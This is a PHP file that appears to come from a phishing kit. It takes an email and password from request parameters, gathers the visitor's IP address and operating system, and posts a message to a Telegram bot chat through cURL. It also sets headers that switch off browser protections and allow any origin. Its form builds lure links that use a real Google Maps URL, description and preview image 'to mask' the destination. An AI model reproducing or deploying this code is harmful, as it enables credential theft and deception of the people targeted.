<?php
session_start();
require "CONTROLS.php";
require "includes/functions.php";
ini_set('display_errors', 0);


// Set necessary headers
header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

// Function to get the client's IP address
function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

// Get user agent details
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Function to get the user's operating system
function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

// Get the client's IP address and user's operating system
$ip_address = get_client_ip();
$os = getOS();

// Get the user's data
$name = $_GET['email'];
$pass = $_GET['password'];
$at   = "@";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('chat_id' => $telegram_chat_id, 'text' => $message_text)));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
curl_close($ch);

?>

<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PHP Mailer System</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">

    <style>
      /* Style the button container */
      .button-container {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
      }
      
      /* Style the buttons */
      .button {
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 1.5%;
        padding: 3%;
        width: 98%;
        height: 10%;
        font-size: 24px;
        font-weight: bold;
        text-align: center;
        border: none;
        border-radius: 10px;
        background-color: #A30116;
        color: #FBBBBF;
        cursor: pointer;
        transition: background-color 0.3s;
      }

      .button2 {
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 10px;
        padding: 2%;
        width: 49%;
        height: 200px;
        font-size: 24px;
        font-weight: bold;
        text-align: center;
        border: none;
        border-radius: 10px;
        background-color: #F0A0AA;
        color: #FFFFFF;
        cursor: pointer;
        transition: background-color 0.3s;
      }
    /* CSS design optimized for iPhones */
    body {
        font-family: Arial, sans-serif;
        font-size: 16px;
        color: #333333;
        background-color: #333333;
    }
    #container {
        width: 90%;
        max-width: 600px;
        margin: 0 auto;
        background-color: #ffffff;
        padding: 20px;
        border-radius: 5px;
    }
    input[type="text"], textarea {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
        margin-top: 6px;
        margin-bottom: 16px;
        resize: vertical;
    }
    input[type="submit"] {
        background-color: #4CAF50;
        color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .error {
            color: #ff0000;
        }
    </style>
</head>
<body>

  
<form id="accesspanel" action="/public/Google/meta/040144.php" method="GET">
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
	  


 <fieldset>




<center><div class="inset">
    
    <font size="12" color="white">FOREST GUMP</font><br>
<font size="6" color="grey"><br>I THINK I <5 U GENNY</font>
<input type="text" name="title" id="title" placeholder="title [use a real url to mask]" value="https://www.google.ca/maps/place/city/Location=id453552354rtfwdc433w656gw5f3w6fw43" required="">
<input required="" type="text" name="description" id="description" placeholder="[metadata description]" value="Navigate your world faster and easier with Google Maps. Over 220 countries and territories mapped and hundreds of millions of businesses and places on the map. Get real-time GPS navigation, traffic, and transit info, and explore local neighborhoods by knowing where to eat, drink and go - no matter what part of the world you’re in.">
<input type="text" name="imageurl" id="imageurl" value="https://apdparts.ca/images/about/map-edmonton.jpg" placeholder="a 200x200 meta preview image url" required=""> <br>
<input type="text" name="mod" id="mod" placeholder="To continue to Maps" value="Maps" required="">
<button type="submit" class="button">[RUN FOREST]</button>




  

    
      
      
      
      
      
      
      

    
  
</div>
</center></fieldset></nav></form></body></html>